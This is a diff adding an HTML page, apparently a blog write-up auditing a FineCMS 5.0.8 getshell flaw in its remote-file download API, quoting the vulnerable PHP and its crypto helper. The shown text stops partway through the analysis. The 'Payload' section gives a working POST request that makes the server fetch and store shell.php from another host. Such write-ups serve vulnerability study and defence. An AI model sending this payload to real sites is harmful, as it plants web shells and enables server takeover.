@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
+漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&amp;#39;&amp;amp;&amp;#39;, $this-&amp;gt;input-&amp;gt;post(&amp;#39;url&amp;#39;)); //经过&amp;amp; 分割  foreach ($url as $t) { $item = explode(&amp;#39;=&amp;#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&amp;gt;uid &amp;amp;&amp;amp; exit(dr_json(0, fc_lang(&amp;#39;游客不允许上传附件&amp;#39;))); //对$p[&amp;#39;code&amp;#39;] 进行解码  list($size, $ext) = explode(&amp;#39;|&amp;#39;, dr_authcode($p[&amp;#39;code&amp;#39;], &amp;#39;DECODE&amp;#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#39;Ym&amp;#39;, SYS_TIME).&amp;#39;/&amp;#39;; !is_dir($path) &amp;amp;&amp;amp; dr_mkdirs($path); $furl = $this-&amp;gt;input-&amp;gt;post(&amp;#39;file&amp;#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !" /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)" />
+<meta property="og:description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
+漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&#39;&amp;&#39;, $this-&gt;input-&gt;post(&#39;url&#39;)); //经过&amp; 分割  foreach ($url as $t) { $item = explode(&#39;=&#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&gt;uid &amp;&amp; exit(dr_json(0, fc_lang(&#39;游客不允许上传附件&#39;))); //对$p[&#39;code&#39;] 进行解码  list($size, $ext) = explode(&#39;|&#39;, dr_authcode($p[&#39;code&#39;], &#39;DECODE&#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&#39;/&#39;.date(&#39;Ym&#39;, SYS_TIME).&#39;/&#39;; !is_dir($path) &amp;&amp; dr_mkdirs($path); $furl = $this-&gt;input-&gt;post(&#39;file&#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/" />
+<meta property="article:published_time" content="2018-02-28T22:23:23+00:00" />
+<meta property="article:modified_time" content="2018-02-28T22:23:23+00:00" />
+<meta itemprop="name" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)">
+<meta itemprop="description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
+漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&#39;&amp;&#39;, $this-&gt;input-&gt;post(&#39;url&#39;)); //经过&amp; 分割  foreach ($url as $t) { $item = explode(&#39;=&#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&gt;uid &amp;&amp; exit(dr_json(0, fc_lang(&#39;游客不允许上传附件&#39;))); //对$p[&#39;code&#39;] 进行解码  list($size, $ext) = explode(&#39;|&#39;, dr_authcode($p[&#39;code&#39;], &#39;DECODE&#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&#39;/&#39;.date(&#39;Ym&#39;, SYS_TIME).&#39;/&#39;; !is_dir($path) &amp;&amp; dr_mkdirs($path); $furl = $this-&gt;input-&gt;post(&#39;file&#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !">
+<meta itemprop="datePublished" content="2018-02-28T22:23:23+00:00" />
+<meta itemprop="dateModified" content="2018-02-28T22:23:23+00:00" />
+<meta itemprop="wordCount" content="702">
+
+
+
+<meta itemprop="keywords" content="漏洞,代码审计,php,FineCMS,getshell," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)"/>
+<meta name="twitter:description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
+漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&#39;&amp;&#39;, $this-&gt;input-&gt;post(&#39;url&#39;)); //经过&amp; 分割  foreach ($url as $t) { $item = explode(&#39;=&#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&gt;uid &amp;&amp; exit(dr_json(0, fc_lang(&#39;游客不允许上传附件&#39;))); //对$p[&#39;code&#39;] 进行解码  list($size, $ext) = explode(&#39;|&#39;, dr_authcode($p[&#39;code&#39;], &#39;DECODE&#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&#39;/&#39;.date(&#39;Ym&#39;, SYS_TIME).&#39;/&#39;; !is_dir($path) &amp;&amp; dr_mkdirs($path); $furl = $this-&gt;input-&gt;post(&#39;file&#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</h1>
+        <p class="post-meta">Feb 28, 2018</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="前言">前言</h1>
+<p>这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在<code>漏洞时代</code>又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。</p>
+<h1 id="漏洞详情">漏洞详情</h1>
+<h2 id="代码位置和代码">代码位置和代码</h2>
+<ul>
+<li>位置
+<code>\finecms\dayrui\controllers\member\Api.php</code></li>
+<li>代码</li>
+</ul>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">down_file</span><span class="p">()</span> <span class="p">{</span>
+ 
+    <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+    <span class="c1">//经过&amp; 分割
+</span><span class="c1"></span> 
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+        <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="c1">//经过 = 分割
+</span><span class="c1"></span>    <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;游客不允许上传附件&#39;</span><span class="p">)));</span>
+    <span class="c1">//对$p[&#39;code&#39;] 进行解码
+</span><span class="c1"></span>    <span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+    <span class="c1">//得到尺寸和后缀
+</span><span class="c1"></span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Ym&#39;</span><span class="p">,</span> <span class="nx">SYS_TIME</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+    <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">dr_mkdirs</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+ 
+    <span class="nv">$furl</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">dr_catcher_data</span><span class="p">(</span><span class="nv">$furl</span><span class="p">);</span>
+    <span class="c1">//dr_catcher_data 是读取远程文件
+</span><span class="c1"></span>    <span class="o">!</span><span class="nv">$file</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;获取远程文件失败&#39;</span><span class="p">));</span>
+ 
+    <span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span><span class="c1"></span>    <span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+     
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">999</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">&#39;file_ext&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+            <span class="s1">&#39;full_path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+            <span class="s1">&#39;file_size&#39;</span> <span class="o">=&gt;</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span>
+            <span class="s1">&#39;client_name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+        <span class="p">);</span>
+</code></pre></div><h2 id="执行过程">执行过程</h2>
+<h3 id="payload代码">Payload代码</h3>
+<p><code>http://finecmstest.com/index.php?s=member&amp;c=api&amp;m=down_file</code></p>
+<p>POST:url=code=d628NBt44h5NLBYyi2QIPBI37HOHqQJz/JvPubFBaG5c&amp;file=http://192.168.232.128/shell.php</p>
+<h3 id="执行结果">执行结果</h3>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down1.png" alt="finecms_down1"></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down2.png" alt="finecms_down1"></p>
+<h2 id="分析过程">分析过程</h2>
+<p>老样子，挑重要的代码来读，跟着我的思路能读懂这段函数的流程。</p>
+<ul>
+<li><code>$p = array();</code>创建一个数组，为下面的遍历赋值所用。
+<code>$url = explode('&amp;', $this-&gt;input-&gt;post('url'));</code>接收url参数的值，<code>explode</code>这个函数就不用多说了，用于把字符串转换成数组，以<code>&amp;</code>分割为一个数组。
+<code>foreach ($url as $t) {$item = explode('=', $t);$p[$item[0]] = $item[1];}</code> 这一段遍历就是把上面的数组赋值给$p变量。
+<code>!$this-&gt;uid &amp;&amp; exit(dr_json(0,fc_lang('抱歉！游客不允许上传附件')));</code>判断是否登录</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+            <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;抱歉！游客不允许上传附件&#39;</span><span class="p">)));</span>
+</code></pre></div><ul>
+<li>这段用了<code>list</code>函数，就是把<code>explode</code>的三个值赋值给<code>$size, $ext, $path</code>, 当中用了<code>dr_authcode</code>这个函数，跟进了一下这个函数在<code>\finecms\dayrui\helpers\function_helper.php</code>里面，是一段discuz加密/解密的函数，这个函数主要看的是<code>$key = md5($key ? $key : SYS_KEY);</code>和<code>$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;$string_length = strlen($string);</code>这两句，<code>SYS_KEY</code>这个值在上一篇文章看过了，值是固定的，所以不用理会。下来一句就是如果$operation == &lsquo;DECODE&rsquo;那就解密，如果不等于DECODE那就加密。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$path</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+</code></pre></div><p><strong>dr_authcode函数代码：</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">dr_authcode</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+
+    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">SYS_KEY</span><span class="p">);</span>
+    <span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span> <span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+    <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span> <span class="o">.</span> <span class="nv">$keyc</span><span class="p">);</span>
+    <span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
+
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+
+    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+    <span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+        <span class="nv">$result</span><span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$keyc</span> <span class="o">.</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><ul>
+<li>这段代码就是生成文件的路径，<code>dr_mkdirs</code>在上一篇的已经解释过了，生成的目录是日期。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="nv">$path</span> <span class="o">=</span> <span class="nx">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Ym&#39;</span><span class="p">,</span> <span class="nx">SYS_TIME</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
